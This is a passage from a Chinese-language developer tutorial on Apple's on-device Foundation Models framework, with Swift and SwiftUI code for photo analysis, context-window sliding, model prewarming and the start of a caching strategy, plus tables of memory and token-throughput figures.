                <span class="hljs-keyword">return</span> <span class="hljs-string">"生成失败: <span class="hljs-subst">\(generationError.localizedDescription)</span>"</span>  
            }  
        }  
        <span class="hljs-keyword">return</span> <span class="hljs-string">"错误: <span class="hljs-subst">\(error.localizedDescription)</span>"</span>  
    }  
}  
</code></pre>
<h4 data-id="heading-48">步骤4: 在SwiftUI中使用</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> SwiftUI

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">PhotoAnalysisView</span>: <span class="hljs-title class_">View</span> {  
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">PhotoAnalysisViewModel</span>()  
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> selectedPhoto: <span class="hljs-type">Photo</span>?  
      
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {  
        <span class="hljs-type">VStack</span> {  
            <span class="hljs-keyword">if</span> viewModel.isLoading {  
                <span class="hljs-type">ProgressView</span>(<span class="hljs-string">"分析中..."</span>)  
                    .padding()  
            }  
              
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> error <span class="hljs-operator">=</span> viewModel.errorMessage {  
                <span class="hljs-type">Text</span>(<span class="hljs-string">"错误: <span class="hljs-subst">\(error)</span>"</span>)  
                    .foregroundColor(.red)  
                    .padding()  
            }  
              
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> viewModel.analysisResult {  
                <span class="hljs-type">VStack</span>(alignment: .leading, spacing: <span class="hljs-number">12</span>) {  
                    <span class="hljs-type">Text</span>(<span class="hljs-string">"主题: <span class="hljs-subst">\(result.subject)</span>"</span>)  
                    <span class="hljs-type">Text</span>(<span class="hljs-string">"质量评分: <span class="hljs-subst">\(result.qualityScore)</span>/10"</span>)  
                    <span class="hljs-type">Text</span>(<span class="hljs-string">"标签: <span class="hljs-subst">\(result.tags.joined(separator: <span class="hljs-string">", "</span>))</span>"</span>)  
                }  
                .padding()  
            }  
              
            <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>viewModel.streamingText.isEmpty {  
                <span class="hljs-type">ScrollView</span> {  
                    <span class="hljs-type">Text</span>(viewModel.streamingText)  
                        .padding()  
                }  
            }  
              
            <span class="hljs-type">Button</span>(<span class="hljs-string">"分析照片"</span>) {  
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> photo <span class="hljs-operator">=</span> selectedPhoto {  
                    <span class="hljs-type">Task</span> {  
                        <span class="hljs-keyword">await</span> viewModel.analyzePhoto(photo)  
                    }  
                }  
            }  
            .disabled(viewModel.isLoading <span class="hljs-operator">||</span> selectedPhoto <span class="hljs-operator">==</span> <span class="hljs-literal">nil</span>)  
        }  
    }  
}  
</code></pre>
<h3 data-id="heading-49">4.2 性能优化实践</h3>
<h4 data-id="heading-50">内存消耗与性能特征</h4>
<p><strong>实际内存占用</strong>:</p>
<p>根据实际测试，Foundation Models 在运行时的内存消耗包括：</p>






























<table><thead><tr><th>组件</th><th>内存占用</th><th>说明</th></tr></thead><tbody><tr><td>模型权重</td><td>~750MB</td><td>3B 参数 × 2-bit 量化</td></tr><tr><td>KV Cache</td><td>~300-600MB</td><td>8-bit 量化，37.5% 减少优化</td></tr><tr><td>框架开销</td><td>~100-200MB</td><td>系统框架和运行时开销</td></tr><tr><td><strong>总计</strong></td><td><strong>~1.0-1.5GB</strong></td><td>实际运行时内存占用</td></tr></tbody></table>
<p><strong>内存管理建议</strong>:</p>
<ul>
<li>在内存受限的设备上，需要仔细考虑何时加载和释放 session</li>
<li>好消息是苹果做了很多优化，比如 KV cache 的 8-bit 量化和 37.5% 的 block sharing 减少</li>
<li>base 模型本身似乎在不用时也会自动 unload</li>
</ul>
<p><strong>性能特征</strong>:</p>























<table><thead><tr><th>场景</th><th>iPhone</th><th>M2 Pro</th><th>说明</th></tr></thead><tbody><tr><td>单 session</td><td>10-30 tokens/s</td><td>~30 tokens/s</td><td>正常性能</td></tr><tr><td>3 个并发 session</td><td><strong>每个约 1 token/s</strong></td><td><strong>每个约 1 token/s</strong></td><td>⚠️ 严重性能下降</td></tr></tbody></table>
<p><strong>⚠️ 并发性能警告</strong>: 多 session 并发会严重影响性能，从 10-30 tokens/s 骤降至约 1 token/s。苹果只考虑了单 session 的使用场景。</p>
<p><strong>推荐做法</strong>: 全局管理<strong>一个 session</strong>，使用队列串行访问，避免任何并发 session。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ✅ 推荐：使用队列管理请求  </span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">SessionManager</span> {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> requestQueue: [<span class="hljs-type">AIRequest</span>] <span class="hljs-operator">=</span> []  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">processRequest</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">request</span>: <span class="hljs-type">AIRequest</span>) <span class="hljs-keyword">async</span> -&gt; <span class="hljs-type">AIResponse</span> {  
        <span class="hljs-comment">// 串行处理，不要并发  </span>
        <span class="hljs-comment">// 使用队列确保同一时间只有一个请求在使用 session  </span>
    }  
}  
</code></pre>
<h4 data-id="heading-51">上下文窗口管理</h4>
<p><strong>⚠️ 重要限制</strong>: 虽然苹果提到模型训练时支持最高 65K tokens 的上下文，但<strong>实际部署到用户设备上的硬限制是 4096 tokens</strong>。这对于一般的对话场景，大约能支持 10-20 轮对话。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Start([开始对话]) --&gt; Check{Token使用量&lt;br/&gt;检查}  
    Check --&gt;|小于80%| Normal[正常使用]  
    Check --&gt;|达到80%| Clean[清理旧对话]  
    Normal --&gt; Continue[继续对话]  
    Clean --&gt; Keep[保留最近对话&lt;br/&gt;约3000 tokens]  
    Keep --&gt; Continue  
    Continue --&gt; Check  
      
    style Start fill:#007AFF,color:#fff  
    style Check fill:#FF9500,color:#fff  
    style Normal fill:#34C759,color:#fff  
    style Clean fill:#FF3B30,color:#fff  
    style Keep fill:#5AC8FA,color:#000  
</code></pre>
<p><strong>实现代码</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedChatViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {  
    <span class="hljs-comment">// ⚠️ 实际限制是 4096 tokens，不是 65K  </span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxTokens <span class="hljs-operator">=</span> <span class="hljs-number">4096</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> windowThreshold <span class="hljs-operator">=</span> <span class="hljs-number">0.8</span> <span class="hljs-comment">// 80%时开始清理  </span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> targetWindowSize <span class="hljs-operator">=</span> <span class="hljs-number">3000</span> <span class="hljs-comment">// 目标窗口大小（保留一些余量）  </span>
      
    <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> session: <span class="hljs-type">LanguageModelSession</span>  
      
    <span class="hljs-keyword">init</span>() {  
        <span class="hljs-keyword">self</span>.session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
    }  
      
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">shouldApplySlidingWindow</span>() -&gt; <span class="hljs-type">Bool</span> {  
        <span class="hljs-keyword">let</span> currentTokens <span class="hljs-operator">=</span> session.transcript.estimatedTokenCount  
        <span class="hljs-keyword">let</span> ratio <span class="hljs-operator">=</span> <span class="hljs-type">Double</span>(currentTokens) <span class="hljs-operator">/</span> <span class="hljs-type">Double</span>(maxTokens)  
        <span class="hljs-keyword">return</span> ratio <span class="hljs-operator">&gt;=</span> windowThreshold  
    }  
      
    <span class="hljs-meta">@MainActor</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">applySlidingWindow</span>() <span class="hljs-keyword">async</span> {  
        <span class="hljs-keyword">let</span> recentEntries <span class="hljs-operator">=</span> session.transcript.entriesWithinTokenBudget(  
            targetWindowSize: targetWindowSize  
        )  
          
        <span class="hljs-keyword">var</span> finalEntries <span class="hljs-operator">=</span> recentEntries  
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> instructions <span class="hljs-operator">=</span> session.transcript.first(where: {  
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">case</span> .instructions <span class="hljs-operator">=</span> <span class="hljs-variable">$0</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span> }  
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>  
        }) {  
            <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>finalEntries.contains(where: { <span class="hljs-variable">$0</span>.id <span class="hljs-operator">==</span> instructions.id }) {  
                finalEntries.insert(instructions, at: <span class="hljs-number">0</span>)  
            }  
        }  
          
        session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>(  
            transcript: <span class="hljs-type">Transcript</span>(entries: finalEntries)  
        )  
    }  
      
    <span class="hljs-meta">@MainActor</span>  
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">sendMessage</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> {  
        <span class="hljs-keyword">if</span> shouldApplySlidingWindow() {  
            <span class="hljs-keyword">await</span> applySlidingWindow()  
        }  
          
        <span class="hljs-keyword">let</span> stream <span class="hljs-operator">=</span> session.streamResponse(to: <span class="hljs-type">Prompt</span>(message))  
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> stream {  
            <span class="hljs-comment">// 流式响应自动更新transcript  </span>
        }  
    }  
}  
</code></pre>
<h4 data-id="heading-52">预加载和预热（Prewarming）</h4>
<p><strong>预热（Prewarming）</strong> 是在用户发出请求之前，提前加载和初始化设备上的语言模型，从而减少初始延迟的关键优化技术。</p>
<h5 data-id="heading-53">预热的工作原理</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    subgraph NoPrewarm [无预热场景]  
        User1[用户请求] --&gt; Load1[加载模型 耗时 2-3秒]  
        Load1 --&gt; Init1[初始化模型 耗时 0.5-1秒]  
        Init1 --&gt; Inference1[执行推理 耗时 1-2秒]  
        Inference1 --&gt; Response1[返回结果 总耗时 3.5-6秒]  
    end  
      
    subgraph WithPrewarm [预热场景]  
        Trigger[触发预热 用户打开页面或点击输入框] --&gt; Load2[后台加载模型 用户无感知]  
        Load2 --&gt; Init2[后台初始化模型 用户无感知]  
        Init2 --&gt; Ready[模型准备就绪 保持在内存中]  
        User2[用户请求] --&gt; Inference2[立即执行推理 耗时 1-2秒]  
        Inference2 --&gt; Response2[返回结果 总耗时 1-2秒]  
    end  
      
    style User1 fill:#FF3B30,color:#fff  
    style Load1 fill:#FF3B30,color:#fff  
    style Response1 fill:#FF3B30,color:#fff  
    style Trigger fill:#5AC8FA,color:#000  
    style Ready fill:#34C759,color:#fff  
    style User2 fill:#007AFF,color:#fff  
    style Response2 fill:#34C759,color:#fff  
</code></pre>
<p><strong>预热的核心价值</strong>:</p>
<ul>
<li>✅ <strong>减少首次调用延迟</strong>: 从 3-6 秒降低到 1-2 秒</li>
<li>✅ <strong>提升用户体验</strong>: 用户几乎无感知的等待时间</li>
<li>✅ <strong>优化资源利用</strong>: 在用户空闲时提前准备，避免阻塞主线程</li>
</ul>
<h5 data-id="heading-54">预热的最佳时机</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    AppStart[应用启动] --&gt; Check1{是否支持 Foundation Models?}  
    Check1 --&gt;|是| Prewarm1[后台预热 低优先级]  
    Check1 --&gt;|否| Skip1[跳过预热]  
      
    UserEnter[用户进入AI功能页面] --&gt; Prewarm2[立即预热 中优先级]  
      
    UserClick[用户点击输入框] --&gt; Prewarm3[快速预热 高优先级]  
      
    Prewarm1 --&gt; Ready[模型准备就绪]  
    Prewarm2 --&gt; Ready  
    Prewarm3 --&gt; Ready  
      
    Ready --&gt; UserRequest[用户发起请求]  
    UserRequest --&gt; FastResponse[快速响应]  
      
    style AppStart fill:#007AFF,color:#fff  
    style UserEnter fill:#5AC8FA,color:#000  
    style UserClick fill:#FF9500,color:#fff  
    style Prewarm1 fill:#34C759,color:#fff  
    style Prewarm2 fill:#34C759,color:#fff  
    style Prewarm3 fill:#34C759,color:#fff  
    style Ready fill:#AF52DE,color:#fff  
    style FastResponse fill:#34C759,color:#fff  
</code></pre>
<p><strong>预热时机优先级</strong>:</p>
<ol>
<li>
<p><strong>应用启动时</strong>（低优先级）<br/>
- 优点：最早准备，用户首次使用即可快速响应<br/>
- 缺点：可能影响应用启动速度<br/>
- 建议：在后台低优先级线程预热，不影响启动</p>
</li>
<li>
<p><strong>用户进入AI功能页面时</strong>（中优先级）<br/>
- 优点：用户明确意图，预热价值高<br/>
- 缺点：如果用户不实际使用，浪费资源<br/>
- 建议：在页面出现时立即预热</p>
</li>
<li>
<p><strong>用户点击输入框时</strong>（高优先级）<br/>
- 优点：用户即将使用，预热最及时<br/>
- 缺点：可能来不及完全预热<br/>
- 建议：快速预热，至少完成基础初始化</p>
</li>
</ol>
<h5 data-id="heading-55">基础预热实现</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelPrewarmer</span> {  
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> shared <span class="hljs-operator">=</span> <span class="hljs-type">ModelPrewarmer</span>()  
      
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isPrewarmed <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> prewarmingTask: <span class="hljs-type">Task</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Never</span>&gt;?  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> prewarmQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"com.app.prewarm"</span>, qos: .utility)  
      
    <span class="hljs-comment">/// 预热模型（基础版本）  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">prewarm</span>() {  
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>isPrewarmed <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> }  
          
        prewarmQueue.async {  
            <span class="hljs-type">Task</span> {  
                <span class="hljs-keyword">do</span> {  
                    <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
                    <span class="hljs-comment">// 发送一个简单的请求来预热模型  </span>
                    <span class="hljs-keyword">_</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(to: <span class="hljs-string">"Hello"</span>)  
                    <span class="hljs-keyword">await</span> <span class="hljs-type">MainActor</span>.run {  
                        <span class="hljs-keyword">self</span>.isPrewarmed <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>  
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 模型预热成功"</span>)  
                    }  
                } <span class="hljs-keyword">catch</span> {  
                    <span class="hljs-keyword">await</span> <span class="hljs-type">MainActor</span>.run {  
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">"⚠️ 模型预热失败: <span class="hljs-subst">\(error)</span>"</span>)  
                    }  
                }  
            }  
        }  
    }  
      
    <span class="hljs-comment">/// 检查预热状态  </span>
    <span class="hljs-keyword">var</span> isReady: <span class="hljs-type">Bool</span> {  
        <span class="hljs-keyword">return</span> isPrewarmed  
    }  
}  
</code></pre>
<h5 data-id="heading-56">智能预热实现（多时机支持）</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">PrewarmPriority</span> {  
    <span class="hljs-keyword">case</span> low      <span class="hljs-comment">// 应用启动时  </span>
    <span class="hljs-keyword">case</span> medium   <span class="hljs-comment">// 进入功能页面时  </span>
    <span class="hljs-keyword">case</span> high     <span class="hljs-comment">// 用户点击输入框时  </span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartModelPrewarmer</span> {  
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> shared <span class="hljs-operator">=</span> <span class="hljs-type">SmartModelPrewarmer</span>()  
      
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isPrewarmed <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> prewarmingTask: <span class="hljs-type">Task</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Never</span>&gt;?  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> prewarmStartTime: <span class="hljs-type">Date</span>?  
      
    <span class="hljs-comment">/// 智能预热：根据优先级和时机决定是否预热  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">prewarm</span>(<span class="hljs-params">priority</span>: <span class="hljs-type">PrewarmPriority</span> <span class="hljs-operator">=</span> .medium) {  
        <span class="hljs-comment">// 如果已经预热，直接返回  </span>
        <span class="hljs-keyword">if</span> isPrewarmed {  
            <span class="hljs-keyword">return</span>  
        }  
          
        <span class="hljs-comment">// 如果正在预热，检查优先级  </span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> task <span class="hljs-operator">=</span> prewarmingTask, <span class="hljs-operator">!</span>task.isCancelled {  
            <span class="hljs-comment">// 高优先级可以取消低优先级预热，重新开始  </span>
            <span class="hljs-keyword">if</span> priority <span class="hljs-operator">==</span> .high {  
                task.cancel()  
            } <span class="hljs-keyword">else</span> {  
                <span class="hljs-keyword">return</span>  
            }  
        }  
          
        <span class="hljs-comment">// 根据优先级设置 QoS  </span>
        <span class="hljs-keyword">let</span> qos: <span class="hljs-type">TaskPriority</span> <span class="hljs-operator">=</span> priority <span class="hljs-operator">==</span> .high <span class="hljs-operator">?</span> .userInitiated : .utility  
          
        prewarmStartTime <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>()  
        prewarmingTask <span class="hljs-operator">=</span> <span class="hljs-type">Task</span>(priority: qos) {  
            <span class="hljs-keyword">do</span> {  
                <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
                  
                <span class="hljs-comment">// 根据优先级选择预热策略  </span>
                <span class="hljs-keyword">switch</span> priority {  
                <span class="hljs-keyword">case</span> .high:  
                    <span class="hljs-comment">// 高优先级：快速预热，只做基础初始化  </span>
                    <span class="hljs-keyword">_</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(to: <span class="hljs-string">"Hi"</span>)  
                <span class="hljs-keyword">case</span> .medium:  
                    <span class="hljs-comment">// 中优先级：完整预热  </span>
                    <span class="hljs-keyword">_</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(to: <span class="hljs-string">"Hello, how can I help you?"</span>)  
                <span class="hljs-keyword">case</span> .low:  
                    <span class="hljs-comment">// 低优先级：后台预热，不阻塞  </span>
                    <span class="hljs-keyword">_</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(to: <span class="hljs-string">"Hello"</span>)  
                }  
                  
                <span class="hljs-keyword">let</span> duration <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>().timeIntervalSince(<span class="hljs-keyword">self</span>.prewarmStartTime <span class="hljs-operator">??</span> <span class="hljs-type">Date</span>())  
                <span class="hljs-keyword">await</span> <span class="hljs-type">MainActor</span>.run {  
                    <span class="hljs-keyword">self</span>.isPrewarmed <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>  
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ 模型预热成功（优先级: <span class="hljs-subst">\(priority)</span>, 耗时: <span class="hljs-subst">\(String(format: <span class="hljs-string">"%.2f"</span>, duration))</span>秒）"</span>)  
                }  
            } <span class="hljs-keyword">catch</span> {  
                <span class="hljs-keyword">await</span> <span class="hljs-type">MainActor</span>.run {  
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">"⚠️ 模型预热失败: <span class="hljs-subst">\(error)</span>"</span>)  
                }  
            }  
        }  
    }  
      
    <span class="hljs-comment">/// 取消预热（如果用户离开页面）  </span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">cancelPrewarming</span>() {  
        prewarmingTask<span class="hljs-operator">?</span>.cancel()  
        prewarmingTask <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>  
    }  
}  
</code></pre>
<h5 data-id="heading-57">在应用中的集成</h5>
<p><strong>场景1: 应用启动时预热</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">@main</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyApp</span>: <span class="hljs-title class_">App</span> {  
    <span class="hljs-keyword">init</span>() {  
        <span class="hljs-comment">// 应用启动时，低优先级预热  </span>
        <span class="hljs-type">Task</span>.detached(priority: .utility) {  
            <span class="hljs-keyword">await</span> <span class="hljs-type">SmartModelPrewarmer</span>.shared.prewarm(priority: .low)  
        }  
    }  
}  
</code></pre>
<p><strong>场景2: 进入AI功能页面时预热</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">PhotoAnalysisView</span>: <span class="hljs-title class_">View</span> {  
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">PhotoAnalysisViewModel</span>()  
      
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {  
        <span class="hljs-type">VStack</span> {  
            <span class="hljs-comment">// UI 内容  </span>
        }  
        .onAppear {  
            <span class="hljs-comment">// 用户进入页面时，立即预热  </span>
            <span class="hljs-type">SmartModelPrewarmer</span>.shared.prewarm(priority: .medium)  
        }  
        .onDisappear {  
            <span class="hljs-comment">// 用户离开页面时，可以取消预热（可选）  </span>
            <span class="hljs-comment">// SmartModelPrewarmer.shared.cancelPrewarming()  </span>
        }  
    }  
}  
</code></pre>
<p><strong>场景3: 用户点击输入框时预热</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChatInputView</span>: <span class="hljs-title class_">View</span> {  
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> inputText <span class="hljs-operator">=</span> <span class="hljs-string">""</span>  
    <span class="hljs-meta">@FocusState</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isInputFocused: <span class="hljs-type">Bool</span>  
      
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {  
        <span class="hljs-type">TextField</span>(<span class="hljs-string">"输入消息..."</span>, text: <span class="hljs-variable">$inputText</span>)  
            .focused(<span class="hljs-variable">$isInputFocused</span>)  
            .onChange(of: isInputFocused) { focused <span class="hljs-keyword">in</span>  
                <span class="hljs-keyword">if</span> focused {  
                    <span class="hljs-comment">// 用户点击输入框时，高优先级快速预热  </span>
                    <span class="hljs-type">SmartModelPrewarmer</span>.shared.prewarm(priority: .high)  
                }  
            }  
    }  
}  
</code></pre>
<h5 data-id="heading-58">预热效果对比</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR  
    subgraph NoPrewarm [无预热]  
        Request1[用户请求] --&gt; Wait1[等待 3-6秒]  
        Wait1 --&gt; Response1[返回结果]  
    end  
      
    subgraph WithPrewarm [有预热]  
        Prewarm[提前预热 用户无感知] --&gt; Ready[模型就绪]  
        Request2[用户请求] --&gt; Wait2[等待 1-2秒]  
        Wait2 --&gt; Response2[返回结果]  
    end  
      
    style Request1 fill:#FF3B30,color:#fff  
    style Wait1 fill:#FF3B30,color:#fff  
    style Prewarm fill:#34C759,color:#fff  
    style Ready fill:#34C759,color:#fff  
    style Request2 fill:#007AFF,color:#fff  
    style Wait2 fill:#5AC8FA,color:#000  
    style Response2 fill:#34C759,color:#fff  
</code></pre>
<p><strong>性能提升数据</strong>（基于 Instruments 分析）:</p>





























<table><thead><tr><th>场景</th><th>无预热</th><th>有预热</th><th>提升</th></tr></thead><tbody><tr><td>首次调用延迟</td><td>3-6秒</td><td>1-2秒</td><td><strong>50-70%</strong></td></tr><tr><td>用户感知等待</td><td>明显</td><td>几乎无感知</td><td><strong>显著改善</strong></td></tr><tr><td>内存占用</td><td>按需加载</td><td>提前占用</td><td>增加约 200-500MB</td></tr></tbody></table>
<h5 data-id="heading-59">预热最佳实践</h5>
<p><strong>1. 预热时机选择</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap  
  root((预热时机选择))  
    应用启动  
      低优先级  
      后台执行  
      不影响启动速度  
    进入功能页面  
      中优先级  
      立即执行  
      用户意图明确  
    点击输入框  
      高优先级  
      快速预热  
      最及时响应  
    避免过度预热  
      不要频繁预热  
      检查预热状态  
      避免资源浪费  
</code></pre>
<p><strong>2. 预热策略建议</strong></p>
<ul>
<li>✅ <strong>渐进式预热</strong>: 先做基础初始化，再逐步完善</li>
<li>✅ <strong>优先级管理</strong>: 根据用户行为调整预热优先级</li>
<li>✅ <strong>资源监控</strong>: 使用 Instruments 监控预热对内存和性能的影响</li>
<li>✅ <strong>降级处理</strong>: 如果预热失败，提供友好的降级方案</li>
</ul>
<p><strong>3. 预热检查清单</strong></p>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否在合适的时机触发预热？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 预热是否影响应用启动速度？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否处理了预热失败的情况？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否在用户离开页面时取消不必要的预热？</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 是否使用 Instruments 验证预热效果？</li>
</ul>
<p><strong>参考资源</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fzvayivqt0ufji%2Farticle%2Fdetails%2F149374995" target="_blank" title="https://blog.csdn.net/zvayivqt0ufji/article/details/149374995" ref="nofollow noopener noreferrer">CSDN - Foundation Models 预热优化</a></li>
</ul>
<h4 data-id="heading-60">缓存策略</h4>
<p>缓存策略是优化 Foundation Models 应用性能的重要手段。合理的缓存可以显著减少重复计算，提升响应速度，降低资源消耗。</p>
<h5 data-id="heading-61">缓存策略概述</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Request[用户请求] --&gt; CheckCache{检查缓存}  
    CheckCache --&gt;|命中| ReturnCache[返回缓存结果 快速响应]  
    CheckCache --&gt;|未命中| Generate[调用 Foundation Models 生成结果]  
    Generate --&gt; Store[存储到缓存]  
    Store --&gt; ReturnNew[返回新结果]  
      
    subgraph CacheManagement [缓存管理]  
        Store --&gt; Evict{缓存已满?}  
        Evict --&gt;|是| Strategy[执行淘汰策略 LRU/LFU/FIFO]  
        Evict --&gt;|否| Keep[保留缓存]  
        Strategy --&gt; Keep  
    end  
      
    style Request fill:#007AFF,color:#fff  
    style CheckCache fill:#FF9500,color:#fff  
    style ReturnCache fill:#34C759,color:#fff  
    style Generate fill:#5AC8FA,color:#000  
    style Store fill:#AF52DE,color:#fff  
    style Strategy fill:#FF3B30,color:#fff  
</code></pre>
<p><strong>缓存的核心价值</strong>:</p>
<ul>
<li>✅ <strong>减少重复计算</strong>: 相同输入直接返回缓存结果</li>
<li>✅ <strong>提升响应速度</strong>: 缓存命中时几乎零延迟</li>
<li>✅ <strong>降低资源消耗</strong>: 减少模型调用次数，节省计算资源</li>
<li>✅ <strong>改善用户体验</strong>: 快速响应，特别是重复查看相同内容时</li>
</ul>
<h5 data-id="heading-62">缓存键设计</h5>
<p>缓存键的设计直接影响缓存命中率和有效性。</p>
<p><strong>好的缓存键应该包含</strong>:</p>
<ul>
<li>输入数据的唯一标识（如照片ID）</li>
<li>可能影响结果的数据版本（如修改时间）</li>
<li>生成参数（如不同的Instructions可能产生不同结果）</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheKeyBuilder</span> {  
    <span class="hljs-comment">/// 为照片分析生成缓存键  </span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">keyForPhotoAnalysis</span>(  
        <span class="hljs-params">photoId</span>: <span class="hljs-type">String</span>,  
        <span class="hljs-params">modificationDate</span>: <span class="hljs-type">Date</span>,  
        <span class="hljs-params">instructionsHash</span>: <span class="hljs-type">String</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>  
    ) -&gt; <span class="hljs-type">String</span> {  
        <span class="hljs-keyword">var</span> components <span class="hljs-operator">=</span> [photoId, <span class="hljs-type">String</span>(modificationDate.timeIntervalSince1970)]  
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> hash <span class="hljs-operator">=</span> instructionsHash {  
            components.append(hash)  
        }  
